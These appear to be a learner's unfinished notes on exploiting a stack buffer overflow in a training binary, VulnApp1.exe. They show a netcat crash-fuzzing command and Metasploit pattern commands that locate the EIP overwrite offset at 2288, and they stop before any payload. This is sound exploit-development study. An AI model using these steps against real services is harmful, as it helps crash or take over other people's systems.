Steps:
    1. Identify buffer overlow opportunity
        - Start VulnApp1.exe
        - Start Immunity Debugger and attach to VulnApp1 process
            Downloaded Immunity from here:
                https://github.com/kbandla/ImmunityDebugger/releases/tag/1.85
        - Run `python -c "print(\"A\" * 10000)" | nc 172.29.208.1 7001`
        - Registers ECX, EDX, EBX, EBP, ESI, EDI, EIP are all overidden
            by the buffer overflow.
            And register ESP appears to point to somewhere in the
            malicious buffer.
    2. 


Notes:
    * Identified offset to override EIP
        `msf-pattern_create -l 10000 | nc 172.29.208.1 7001`
        `msf-pattern_offset -l 10000 -q 33794332`
            => Exact match at offset 2288
